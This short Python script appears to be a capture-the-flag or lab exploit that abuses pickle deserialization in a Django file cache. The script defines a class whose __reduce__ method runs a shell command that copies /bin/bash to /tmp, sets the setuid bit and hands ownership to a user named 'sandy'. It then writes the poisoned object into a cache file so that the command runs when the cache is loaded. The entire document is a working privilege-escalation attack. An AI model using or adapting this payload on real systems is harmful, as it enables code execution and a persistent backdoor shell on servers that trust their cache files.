import pickle

class Harmful:
    def __reduce__(self):
        import os
        return (os.system, ("cp /bin/bash /tmp/sandybash && chmod 4755 /tmp/sandybash && chown sandy:sandy /tmp/sandybash",))

pickle.dump(Harmful(),
open("/var/tmp/django_cache/1f0acfe7480a469402f1852f8313db86.djcache", "wb"))
